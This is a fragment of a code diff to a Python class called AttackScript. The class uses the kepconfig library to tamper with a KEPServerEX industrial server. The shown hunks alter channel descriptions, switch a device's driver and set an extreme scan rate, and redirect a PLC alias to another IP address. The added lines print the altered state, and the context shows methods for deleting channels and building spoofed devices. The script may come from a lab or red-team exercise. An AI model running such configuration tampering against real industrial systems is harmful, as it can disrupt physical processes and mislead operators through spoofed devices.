@@ -1,7 +1,4 @@
 from os import walk, path, remove, system, getcwd, mkdir, scandir, urandom, kill, rmdir
-
-import win32com
-from kepconfig.admin.user_groups import modify_user_group
 from psutil import process_iter
 import signal
 import base64
@@ -1072,6 +1069,7 @@ class AttackScript:
         print(json.dumps(
             connectivity.channel.modify_channel(server, {"common.ALLTYPES_DESCRIPTION": "You only live once"}),
             indent=4))
+        print(connectivity.channel.get_channel(server,"Derrick's Channel"))
 
     def kep_delete_channel(self, channel):
         server = self.kep_connect()
@@ -1141,6 +1139,7 @@ class AttackScript:
                                                                                 "servermain.MULTIPLE_TYPES_DEVICE_DRIVER": "Modbus RTU Serial",
                                                                                 "servermain.DEVICE_SCAN_MODE_RATE_MS": 8888888}),
                                              indent=4))
+        print(json.dumps(connectivity.device.get_device(server, device_to_modify), indent=4))
 
     def kep_get_spoofed_device_structure(self, channel, device):
         server = self.kep_connect()
@@ -1188,6 +1187,7 @@ class AttackScript:
         print(json.dumps(connectivity.egd.name.modify_name_resolution(server, device_info, {
             "ge_ethernet_global_data.NAME_RESOLUTION_ALIAS": "PLC1",
             "ge_ethernet_global_data.NAME_RESOLUTION_IP_ADDRESS": "192.168.1.200"}), indent=4))
+        print(json.dumps(connectivity.egd.name.get_name_resolution(server, device_info), indent=4))
 
     def kep_get_name_resolution(self, channel, device):
         server = self.kep_connect()
